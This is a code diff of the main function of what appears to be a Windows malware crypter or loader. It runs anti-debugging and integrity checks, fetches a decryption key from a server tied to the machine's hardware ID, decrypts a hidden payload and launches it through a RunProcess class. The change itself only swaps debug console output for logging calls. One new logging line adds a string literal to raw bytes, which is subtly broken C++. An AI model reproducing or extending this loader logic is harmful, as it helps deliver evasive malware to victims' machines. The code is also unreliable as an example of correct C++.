@@ -15,18 +15,13 @@
 
 int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
 
-#ifdef _DEBUG
-    // Instanciate console so I can log things through cout
-    FILE* cmdOut;
-    AllocConsole();
-    freopen_s(&cmdOut, "CONOUT$", "w", stdout); // only output no input
-    cout << "-------------- Debug mode --------------" << endl;
-#endif // _DEBUG
+    FILE* cmdOUT = Logging::InitConsole();
 
 
     // Init Antidebugging
     AntiDebugging antiDbg;
     antiDbg.start();
+
 
     antiDbg.KillIfIntegrityCheckFails();
     PayloadManager* payloadManager = new PayloadManager();
@@ -35,11 +30,10 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
     antiDbg.KillIfIntegrityCheckFails();
     string response = ServerRequests::GetDecryptKey(payloadManager->GetProjectId(), Identification::GetHWID());
 
+
     // Error handling
     if (response.length() <= 0) {
-#ifdef _DEBUG
-        cout << "HTTP Response \" \"" << endl;
-#endif // _DEBUG
+        Logging::mRed("[Error] Empty HTTP response from server");
         exit(-6);
     };
 
@@ -47,9 +41,9 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
     antiDbg.KillIfIntegrityCheckFails();
     vector<BYTE>* dPayload = payloadManager->GetDecryptedPayload(response);
 
-#ifdef _DEBUG
-    cout << "First 3 bytes of decrypted payload: " << dPayload->data()[0] << dPayload->data()[1] << dPayload->data()[2] << endl;
-#endif // _DEBUG
+
+    Logging::mGreen("First 3 bytes of decrypted payload: " + dPayload->data()[0] + dPayload->data()[1] + dPayload->data()[2]);
+
 
     antiDbg.KillIfIntegrityCheckFails();
     RunProcess* runProcess = new RunProcess();
@@ -73,12 +67,8 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
     // Wait for thread to finish
     checkIntegrity.join();
 
-#ifdef _DEBUG
-    cout << "-------------- Exit --------------" << endl;
-    // Clear console
-    fclose(cmdOut);
-    FreeConsole();
-#endif // _DEBUG
+    // Destroy console
+    Logging::DestroyConsole(cmdOUT);
 
     return 0;
 
